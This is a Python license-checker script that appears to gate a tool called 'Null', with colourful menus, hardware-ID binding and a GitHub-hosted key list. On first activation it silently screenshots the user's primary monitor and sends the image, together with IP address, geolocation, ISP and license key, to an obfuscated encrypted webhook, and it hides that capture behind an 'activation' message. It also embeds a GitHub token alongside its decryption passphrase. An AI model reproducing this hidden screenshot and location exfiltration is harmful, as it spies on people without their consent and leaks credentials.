#!/usr/bin/env python3
import sys
import time
import os
import json
import hashlib
import uuid
import requests
import base64
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from colorama import init, Fore, Style

init(autoreset=True)

# Encryption settings
TOKEN_PASSPHRASE = "f0a5baf4-f90b-4800-a407-eb5065382113"
WEBHOOK_PASSPHRASE = "fdfac521-be53-4ed5-b7a0-47606a2f3821"

# Encrypted tokens
ENCRYPTED_GITHUB_TOKEN = "U2FsdGVkX1+EsNr+p0PWwWMW3udxhDXtt6WfIUaTVivHMUcE6wb4CPWd7spuy3moFuiadjsEQGPzojlv30mjc2sPklc8o4FLKqP/xehTeShOgn7LbTfVoiTIy5Sd7F1FKfjcBUSaOb0Zh6jk3JMYgw=="
ENCRYPTED_WEBHOOK = "U2FsdGVkX1+Nw4U/zl83/gKNEByPtf6hHZCyga+N6cKvQZNTQgo9fp4UjeajxHOySDCuZhv6PbgzS+VtCTMzE6ULKXqHChvUSVKiQRxjINzWrVIyWBMs2B3QwUZYflKrEJYj25kQ4wCcLaRIMJUmuoKpmpmKy+5oLz5Bi9FjYzOv8ftNm7Ye41t6Sy87Prwz"

# GitHub repository information
REPO_OWNER = "egirlhunt"
REPO_NAME = "nulllkeys"
FILE_PATH = "keys.json"

# GitHub API URL
GITHUB_API_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"

# Color themes with smooth, extended gradients
def generate_gradient(start_color, end_color, steps=30):
    """Generate smooth gradient between two colors"""
    gradient = []
    for i in range(steps):
        ratio = i / (steps - 1)
        color = int(start_color + (end_color - start_color) * ratio)
        gradient.append(color)
    return gradient

# Define color themes with smooth gradients
COLOR_THEMES = {
    "1": {"name": "Red", "gradient_range": generate_gradient(52, 196, 35)},  # Dark red to bright red
    "2": {"name": "Blue", "gradient_range": generate_gradient(17, 117, 40)},  # Dark blue to light blue
    "3": {"name": "Green", "gradient_range": generate_gradient(22, 120, 35)},  # Dark green to light green
    "4": {"name": "Purple", "gradient_range": generate_gradient(54, 213, 45)},  # Dark purple to pink
    "5": {"name": "Cyan", "gradient_range": generate_gradient(23, 87, 30)},  # Dark cyan to light cyan
    "6": {"name": "Yellow", "gradient_range": generate_gradient(58, 229, 40)},  # Dark yellow to bright yellow
    "7": {"name": "White", "gradient_range": generate_gradient(232, 255, 25)},  # Dark gray to white
    "8": {"name": "Orange", "gradient_range": generate_gradient(130, 221, 25)},  # Dark orange to bright orange
    "9": {"name": "Pink", "gradient_range": generate_gradient(125, 216, 30)},  # Dark pink to light pink
    "10": {"name": "Rainbow", "rainbow": True}  # Proper rainbow
}

# Set default theme to Purple (option 4)
current_theme = COLOR_THEMES["4"]

def get_public_ip():
    """Get public IP address"""
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return "Unknown"

def get_geo_location(ip_address):
    """Get geolocation data for IP address"""
    if ip_address == "Unknown":
        return {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "isp": data.get("isp", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "lat": data.get("lat", "Unknown"),
                    "lon": data.get("lon", "Unknown")
                }
    except:
        pass
    return {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}

def evp_bytes_to_key(password, salt, key_len=32, iv_len=16):
    """OpenSSL EVP_BytesToKey compatible key derivation"""
    d = d_i = b''
    while len(d) < key_len + iv_len:
        d_i = hashlib.md5(d_i + password + salt).digest()
        d += d_i
    return d[:key_len], d[key_len:key_len+iv_len]

def decrypt_aes_openssl(encrypted_text, passphrase):
    """Decrypt AES-256-CBC encrypted text (OpenSSL compatible)"""
    try:
        # Decode base64
        encrypted_data = base64.b64decode(encrypted_text)
        
        # Check for "Salted__" prefix
        if encrypted_data[:8] != b'Salted__':
            return ""
        
        # Extract salt (8 bytes after "Salted__")
        salt = encrypted_data[8:16]
        ciphertext = encrypted_data[16:]
        
        # Derive key and IV using OpenSSL's EVP_BytesToKey
        password = passphrase.encode('utf-8')
        key, iv = evp_bytes_to_key(password, salt, 32, 16)
        
        # Decrypt
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(ciphertext)
        
        # Remove PKCS7 padding
        plaintext = unpad(decrypted, AES.block_size)
        
        return plaintext.decode('utf-8')
        
    except Exception:
        return ""

def get_github_token():
    """Get decrypted GitHub token"""
    token = decrypt_aes_openssl(ENCRYPTED_GITHUB_TOKEN, TOKEN_PASSPHRASE)
    return token

def get_webhook_url():
    """Get decrypted webhook URL"""
    return decrypt_aes_openssl(ENCRYPTED_WEBHOOK, WEBHOOK_PASSPHRASE)

def get_hwid():
    """Generate a unique hardware ID"""
    try:
        hwid_parts = []
        
        # Get MAC address
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0, 8*6, 8)][::-1])
        hwid_parts.append(mac)
        
        # Get machine ID if available
        if os.name == 'posix':
            try:
                with open('/etc/machine-id', 'r') as f:
                    hwid_parts.append(f.read().strip())
            except:
                pass
        
        # Create hash from all parts
        hwid_string = '-'.join(hwid_parts)
        return hashlib.sha256(hwid_string.encode()).hexdigest()[:32]
        
    except Exception as e:
        return str(uuid.getnode())

def generate_random_id():
    """Generate a random 16-character ID"""
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(16))

def save_id_to_file(user_id, license_key):
    """Save ID to text file with warning"""
    warning_text = """⚠️ WARNING: NEVER SHARE THIS ID ⚠️

SHARING THIS COULD LEAD TO YOUR LICENSE KEY GETTING REMOVED OR STOLEN

ANYONE ELSE THAN @uekv ON DISCORD ASKING FOR THIS ID IS A SCAMMER/FAKER

YOUR ID: {user_id}
YOUR LICENSE KEY: {license_key}

This ID is your proof of ownership.
If you lose it, use the "Generate ID" option in the tool.
""".format(user_id=user_id, license_key=license_key)
    
    with open("ID.txt", "w") as f:
        f.write(warning_text)
    
    print(f"{get_color('medium')}[+]{Style.RESET_ALL} {Fore.WHITE}ID saved to ID.txt{Style.RESET_ALL}")
    print(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Keep this file safe! Never share it!{Style.RESET_ALL}")

def get_color(intensity="medium"):
    """Get color based on current theme and intensity"""
    if current_theme.get("rainbow"):
        # Slow, smooth rainbow with more colors
        rainbow_colors = []
        # Red to Orange (slow transition)
        for i in range(196, 209, 2):  # More steps
            rainbow_colors.append(i)
        # Orange to Yellow
        for i in range(208, 227, 2):
            rainbow_colors.append(i)
        # Yellow to Green
        for i in range(226, 44, -4):  # Slower transition
            rainbow_colors.append(i)
        # Green to Blue
        for i in range(46, 88, 2):
            rainbow_colors.append(i)
        # Blue to Purple
        for i in range(20, 130, 3):
            rainbow_colors.append(i)
        
        # Use time for slow animation (every 2 seconds per cycle)
        color_index = int((time.time() * 0.5) % len(rainbow_colors))
        return f"\033[38;5;{rainbow_colors[color_index]}m"
    
    # For regular themes
    gradient_range = current_theme["gradient_range"]
    
    if intensity == "dark":
        return f"\033[38;5;{gradient_range[0]}m"
    elif intensity == "light":
        return f"\033[38;5;{gradient_range[-1]}m"
    else:
        middle_index = len(gradient_range) // 2
        return f"\033[38;5;{gradient_range[middle_index]}m"

def get_gradient_color(position, total_positions):
    """Get smooth gradient color for a specific position"""
    if current_theme.get("rainbow"):
        # Create a very smooth rainbow gradient with many colors
        rainbow_segments = [
            (list(range(196, 209)), 0.15),  # Red to Orange-red
            (list(range(208, 227)), 0.25),  # Orange to Yellow
            (list(range(226, 45, -3)), 0.25),  # Yellow to Green (slower)
            (list(range(46, 88)), 0.20),  # Green to Cyan
            (list(range(20, 130, 2)), 0.15)  # Blue to Purple
        ]
        
        # Flatten all colors
        rainbow_colors = []
        for segment_colors, _ in rainbow_segments:
            rainbow_colors.extend(segment_colors)
        
        if not rainbow_colors:
            rainbow_colors = list(range(196, 231))
        
        # Very slow progression through the rainbow
        color_index = int((position / total_positions) * len(rainbow_colors))
        color_index = color_index % len(rainbow_colors)
        return f"\033[38;5;{rainbow_colors[color_index]}m"
    else:
        # Smooth gradient through the theme's range
        gradient_range = current_theme["gradient_range"]
        if len(gradient_range) == 0:
            return f"\033[38;5;{55}m"
        
        # Ensure we use the full gradient range
        exact_index = (position / max(total_positions, 1)) * (len(gradient_range) - 1)
        color_index = min(int(exact_index), len(gradient_range) - 1)
        return f"\033[38;5;{gradient_range[color_index]}m"

def fetch_license_data():
    """Fetch and parse license data from private GitHub repository"""
    try:
        github_token = get_github_token()
        if not github_token:
            return []
        
        headers = {
            "Authorization": f"Bearer {github_token}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        response = requests.get(GITHUB_API_URL, headers=headers, timeout=10)
        
        if response.status_code == 200:
            file_info = response.json()
            content = base64.b64decode(file_info["content"]).decode('utf-8')
            licenses = json.loads(content)
            return licenses
            
    except Exception:
        pass
    
    return []

def update_license_data(license_key, new_hwid, new_id=""):
    """Update license data in private GitHub repository"""
    try:
        github_token = get_github_token()
        if not github_token:
            return False
        
        # Get current file info
        headers = {
            "Authorization": f"Bearer {github_token}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        response = requests.get(GITHUB_API_URL, headers=headers, timeout=10)
        if response.status_code != 200:
            return False
        
        file_info = response.json()
        current_sha = file_info["sha"]
        current_content = base64.b64decode(file_info["content"]).decode('utf-8')
        
        # Parse and update the JSON
        licenses = json.loads(current_content)
        updated = False
        
        for license_entry in licenses:
            if license_entry.get("Licensekey") == license_key:
                license_entry["hwid"] = new_hwid
                if new_id and not license_entry.get("id"):
                    license_entry["id"] = new_id
                updated = True
                break
        
        if not updated:
            return False
        
        # Update file on GitHub
        update_data = {
            "message": f"Update HWID/ID for {license_key[:8]}...",
            "content": base64.b64encode(json.dumps(licenses, indent=2).encode()).decode(),
            "sha": current_sha
        }
        
        update_response = requests.put(GITHUB_API_URL, headers=headers, json=update_data, timeout=10)
        
        if update_response.status_code in [200, 201]:
            return True
        else:
            return False
            
    except Exception:
        return False

def take_screenshot():
    """Take a screenshot of the current screen using mss"""
    try:
        import mss
        import mss.tools
        
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            screenshot = sct.grab(monitor)
            
            # Convert to bytes using mss.tools
            img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
            return base64.b64encode(img_bytes).decode('utf-8')
            
    except Exception:
        return None

def send_webhook(license_key, hwid, user_id="", geo_info=None):
    """Send registration to webhook with geolocation and screenshot"""
    try:
        webhook_url = get_webhook_url()
        if not webhook_url:
            return False
        
        # Try to take screenshot
        screenshot_b64 = take_screenshot()
        
        # Create fields for embed
        fields = [
            {"name": "License key", "value": f"`{license_key}`", "inline": True},
            {"name": "HWID", "value": f"`{hwid}`", "inline": True}
        ]
        
        if user_id:
            fields.append({"name": "User ID", "value": f"`{user_id}`", "inline": True})
        
        # Add geolocation info if available
        if geo_info:
            geo_fields = []
            if geo_info.get("ip") and geo_info["ip"] != "Unknown":
                geo_fields.append({"name": "IP Address", "value": f"`{geo_info['ip']}`", "inline": True})
            if geo_info.get("country") and geo_info["country"] != "Unknown":
                geo_fields.append({"name": "Country", "value": f"`{geo_info['country']}`", "inline": True})
            if geo_info.get("city") and geo_info["city"] != "Unknown":
                geo_fields.append({"name": "City", "value": f"`{geo_info['city']}`", "inline": True})
            if geo_info.get("isp") and geo_info["isp"] != "Unknown":
                geo_fields.append({"name": "ISP", "value": f"`{geo_info['isp']}`", "inline": False})
            if geo_info.get("region") and geo_info["region"] != "Unknown":
                geo_fields.append({"name": "Region", "value": f"`{geo_info['region']}`", "inline": True})
            
            fields.extend(geo_fields)
        
        # Add screenshot info
        if screenshot_b64:
            fields.append({"name": "Screenshot", "value": "✅ Screenshot attached", "inline": False})
        else:
            fields.append({"name": "Screenshot", "value": "❌ Could not capture screenshot", "inline": False})
        
        # Prepare payload with both content and embed
        payload = {
            "content": f"**License Key:** `{license_key}`",
            "embeds": [{
                "title": "NEW REGISTRATION",
                "color": 16711680,  # Red color
                "fields": fields,
                "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
            }]
        }
        
        # If screenshot was captured, send it as a file
        if screenshot_b64:
            # Send screenshot as a separate message
            screenshot_file = {
                'file': ('screenshot.png', base64.b64decode(screenshot_b64), 'image/png')
            }
            
            # First send the embed with license key
            response1 = requests.post(webhook_url, json=payload, timeout=10)
            
            # Then send the screenshot
            response2 = requests.post(webhook_url, files=screenshot_file, timeout=10)
            
            return response1.status_code == 200 and response2.status_code == 200
        else:
            # Send just the embed
            response = requests.post(webhook_url, json=payload, timeout=10)
            return response.status_code == 200
            
    except Exception:
        return False

def clear_console_keep_ascii():
    """Clear console but keep ASCII art visible"""
    # Move cursor up and clear from cursor to end of screen
    print("\033[2J\033[H")  # Clear screen and move to home position

def display_gradient_ascii_header_only():
    """Display only the header (ASCII art and made by text)"""
    # Clean ASCII art without extra spaces
    ascii_graphic = [
        "⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⡀⣰⡿⠛⠛⠿⢶⣦⣀⠀⢀⣀⣀⣀⣀⣠⡾⠋⠀⠀⠹⣷⣄⣤⣶⡶⠿⠿⣷⡄⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠈⠙⠛⠛⠋⠉⠉⢹⡟⠁⠀⠀⣀⣀⠘⣿⠉⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠁⠀⠀⣾⡋⣽⠿⠛⠿⢶⣤⣤⣤⣤⣿⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⢸⣿⡴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣄⡀⠀⢈⣻⡏⠀⠀⠀⠀⣿⣀⠀⠈⠙⣷⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠙⢷⣄⣀⣀⣼⣏⣿⠀⠀⢀⣿⠀⠀⠀⠀",
        "⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⣿⡉⠉⠁⢀⣠⣿⡇⠀⠀⠀⠀",
        "⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠗⠾⠟⠋⢹⣷⠀⠀⠀⠀",
        "⢀⣤⣤⣤⣿⣤⣄⠀⠀⠀⠴⠚⠲⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⡆⠀⠀⠀⠀⢀⣈⣿⣀⣀⡀⠀",
        "⠀⠀⠀⠈⣿⣠⣾⠟⠛⢷⡄⠀⠀⠀⠀⠀⠀⠀⡤⠶⢦⡀⠀⠀⠀⠀⠹⠯⠃⠀⠀⠀⠈⠉⢩⡿⠉⠉⠉⠁",
        "⠀⠀⣤⡶⠿⣿⣇⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠓⠶⠞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣼⣯⣀⣀⠀⠀",
        "⠀⢰⣯⠀⠀⠈⠻⠀⠀⠀⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠉⠉⠁⠀",
        "⠀⠀⠙⣷⣄⠀⠀⠀⠀⠀⢀⣀⣀⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⡿⢷⣄⡀⠀⠀⠀",
        "⠀⠀⠀⠈⠙⣷⠀⠀⠀⣴⠟⠉⠉⠀⠀⣿⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣾⠟⠉⠀⠀⠈⠉⠀⠀⠀",
        "⠀⠀⠀⠀⠰⣿⠀⠀⠀⠙⢧⣤⡶⠟⢀⣿⠛⢟⡟⡯⠽⢶⡶⠾⢿⣻⣏⣹⡏⣁⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠹⣷⣄⠀⠀⠀⠀⠀⣠⣾⠏⠀⠀⠙⠛⠛⠋⠀⠀⢀⣽⠟⠛⠖⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⠙⠻⠷⠶⠿⠟⠋⠹⣷⣤⣀⡀⠄⣡⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣍⣉⣻⣏⣉⣡⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
    ]
    
    ascii_text = [
        " ███▄    █  █    ██  ██▓     ██▓    ",
        " ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ",
        "▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ",
        "▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░    ",
        "▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒",
        "░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░",
        "░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░ ▒  ░░ ░ ▒  ░",
        "   ░   ░ ░  ░░░ ░ ░   ░ ░     ░ ░   ",
        "         ░    ░         ░  ░    ░  ░",
        "                                    "
    ]
    
    # Calculate positions for smooth gradient
    total_ascii_lines = len(ascii_graphic)
    total_text_lines = len(ascii_text)
    total_lines = total_ascii_lines + total_text_lines + 2  # +2 for made by text and separator
    
    # Display graphic art with smooth gradient
    for i, line in enumerate(ascii_graphic):
        color = get_gradient_color(i, total_lines)
        print(f"{color}{line}")
    
    print()  # Single line break
    
    # Display text art with smooth gradient
    for i, line in enumerate(ascii_text):
        color = get_gradient_color(i + total_ascii_lines, total_lines)
        print(f"{color}{line}")
    
    print()  # Single line break
    
    # Add "made by @uekv on discord" with proper gradient
    made_by_text = "made by @uekv on discord"
    color = get_gradient_color(total_ascii_lines + total_text_lines, total_lines)
    print(f"{color}{made_by_text}{Style.RESET_ALL}")
    
    # Gradient separator line
    gradient_line = "-" * 50
    sep_color = get_gradient_color(total_ascii_lines + total_text_lines + 1, total_lines)
    print(f"{sep_color}{gradient_line}{Style.RESET_ALL}")

def display_gradient_ascii():
    """Full display with license prompt"""
    display_gradient_ascii_header_only()
    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Enter License Key > {Style.RESET_ALL}", end="")

def display_color_selection():
    """Display color selection menu"""
    clear_console_keep_ascii()
    display_gradient_ascii_header_only()
    
    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Color Selection Menu{Style.RESET_ALL}\n")
    
    # Create clean grid: 2 columns, 5 rows
    color_keys = list(COLOR_THEMES.keys())
    
    # Display in 2 columns
    for i in range(0, len(color_keys), 2):
        line = ""
        for j in range(2):
            if i + j < len(color_keys):
                key = color_keys[i + j]
                theme = COLOR_THEMES[key]
                # Use the theme's actual color
                if theme.get("rainbow"):
                    # Show first rainbow color
                    color_code = "\033[38;5;196m"  # Red
                else:
                    mid_color = theme["gradient_range"][len(theme["gradient_range"]) // 2]
                    color_code = f"\033[38;5;{mid_color}m"
                line += f"{color_code}[{key}]{Style.RESET_ALL}{Fore.WHITE} {theme['name']:<15}"
        print(line.rstrip())
    
    print(f"\n{get_color('medium')}{'-' * 50}{Style.RESET_ALL}")
    
    return input(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > {Style.RESET_ALL}")

def display_options_grid():
    """Display options menu"""
    clear_console_keep_ascii()
    display_gradient_ascii_header_only()
    
    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Main Menu - Welcome!{Style.RESET_ALL}\n")
    
    # Display options in a clean row
    options = [
        f"{get_color('light')}[1]{Style.RESET_ALL} Change Color", 
        f"{get_color('light')}[2]{Style.RESET_ALL} Generate ID", 
        f"{get_color('light')}[3]{Style.RESET_ALL} Exit"
    ]
    
    print("   ".join(options))
    print(f"\n{get_color('medium')}{'-' * 50}{Style.RESET_ALL}")
    
    return input(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > {Style.RESET_ALL}")

def validate_license_key():
    """Validate license key against private GitHub database"""
    user_key = input().strip()
    
    if not user_key:
        clear_console_keep_ascii()
        display_gradient_ascii_header_only()
        print(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}No license key entered!{Style.RESET_ALL}")
        return False, ""
    
    clear_console_keep_ascii()
    display_gradient_ascii_header_only()
    print(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Checking private database...{Style.RESET_ALL}")
    time.sleep(1)
    
    try:
        # Fetch license data from private GitHub database
        licenses = fetch_license_data()
        
        if not licenses:
            clear_console_keep_ascii()
            display_gradient_ascii_header_only()
            print(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Private database connection failed{Style.RESET_ALL}")
            return False, ""
        
        # Find the license key
        license_found = False
        current_hwid = get_hwid()
        user_id = ""
        
        for license_entry in licenses:
            if license_entry.get("Licensekey") == user_key:
                license_found = True
                stored_hwid = license_entry.get("hwid", "").strip()
                user_id = license_entry.get("id", "").strip()
                
                if not stored_hwid:
                    # First time activation
                    clear_console_keep_ascii()
                    display_gradient_ascii_header_only()
                    print(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}New activation detected{Style.RESET_ALL}")
                    
                    # Get IP and geolocation for security
                    ip_address = get_public_ip()
                    geo_info = get_geo_location(ip_address)
                    geo_info["ip"] = ip_address
                    
                    # Generate ID if not exists
                    if not user_id:
                        user_id = generate_random_id()
                        print(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}Generated User ID: {user_id}{Style.RESET_ALL}")
                        save_id_to_file(user_id, user_key)
                    
                    # Send webhook notification with geolocation
                    send_webhook(user_key, current_hwid, user_id, geo_info)
                    
                    # Update GitHub database with HWID and ID
                    print(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Updating private database...{Style.RESET_ALL}")
                    if update_license_data(user_key, current_hwid, user_id):
                        print(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}License activated!{Style.RESET_ALL}")
                        time.sleep(2)
                        return True, user_key
                    else:
                        print(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Database update failed{Style.RESET_ALL}")
                        return False, ""
                else:
                    # Check HWID match
                    if stored_hwid == current_hwid:
                        clear_console_keep_ascii()
                        display_gradient_ascii_header_only()
                        print(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}Hardware verified{Style.RESET_ALL}")
                        if user_id and not os.path.exists("ID.txt"):
                            save_id_to_file(user_id, user_key)
                        time.sleep(1)
                        return True, user_key
                    else:
                        clear_console_keep_ascii()
                        display_gradient_ascii_header_only()
                        print(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Hardware mismatch!{Style.RESET_ALL}")
                        print(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Your HWID: {current_hwid[:16]}...{Style.RESET_ALL}")
                        print(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Database HWID: {stored_hwid[:16]}...{Style.RESET_ALL}")
                        print(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}If this is a mistake, DM @uekv{Style.RESET_ALL}")
                        
                        for i in range(10, 0, -1):
                            clear_console_keep_ascii()
                            display_gradient_ascii_header_only()
                            print(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Hardware mismatch!{Style.RESET_ALL}")
                            print(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Closing in {i}...{Style.RESET_ALL}")
                            time.sleep(1)
                        return False, ""
        
        if not license_found:
            clear_console_keep_ascii()
            display_gradient_ascii_header_only()
            print(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}License not found in private database!{Style.RESET_ALL}")
            print(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Closing in 3 seconds...{Style.RESET_ALL}")
            
            for i in range(3, 0, -1):
                clear_console_keep_ascii()
                display_gradient_ascii_header_only()
                print(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}License not found in private database!{Style.RESET_ALL}")
                print(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Closing in {i}...{Style.RESET_ALL}")
                time.sleep(1)
            
            return False, ""
            
    except Exception as e:
        clear_console_keep_ascii()
        display_gradient_ascii_header_only()
        print(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Database error: {e}{Style.RESET_ALL}")
        return False, ""
    
    return False, ""

def main():
    global current_theme
    
    clear_console_keep_ascii()
    display_gradient_ascii()
    
    valid_license, license_key = validate_license_key()
    
    if not valid_license:
        sys.exit(1)
    
    # Main menu loop
    while True:
        choice = display_options_grid()
        
        if choice == "1":
            # Change color
            color_choice = display_color_selection()
            if color_choice in COLOR_THEMES:
                current_theme = COLOR_THEMES[color_choice]
                clear_console_keep_ascii()
                display_gradient_ascii_header_only()
                print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Color changed to {current_theme['name']}{Style.RESET_ALL}")
            else:
                clear_console_keep_ascii()
                display_gradient_ascii_header_only()
                print(f"\n{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Invalid color choice{Style.RESET_ALL}")
            input(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "2":
            # Generate ID
            clear_console_keep_ascii()
            display_gradient_ascii_header_only()
            print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}Generating new ID...{Style.RESET_ALL}")
            
            # Check if license is still valid
            licenses = fetch_license_data()
            user_id = ""
            
            for license_entry in licenses:
                if license_entry.get("Licensekey") == license_key:
                    user_id = license_entry.get("id", "").strip()
                    break
            
            if not user_id:
                user_id = generate_random_id()
                # Update database with new ID
                update_license_data(license_key, get_hwid(), user_id)
            
            save_id_to_file(user_id, license_key)
            print(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}ID generated and saved!{Style.RESET_ALL}")
            input(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == "3" or choice == "exit":
            clear_console_keep_ascii()
            display_gradient_ascii_header_only()
            print(f"\n{Fore.WHITE}[{get_color('light')}-{Fore.WHITE}]{Style.RESET_ALL} {Fore.WHITE}Exiting...{Style.RESET_ALL}")
            time.sleep(1)
            sys.exit(0)
            
        else:
            clear_console_keep_ascii()
            display_gradient_ascii_header_only()
            print(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Invalid option{Style.RESET_ALL}")
            input(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear_console_keep_ascii()
        display_gradient_ascii_header_only()
        print(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Interrupted{Style.RESET_ALL}")
        sys.exit(0)
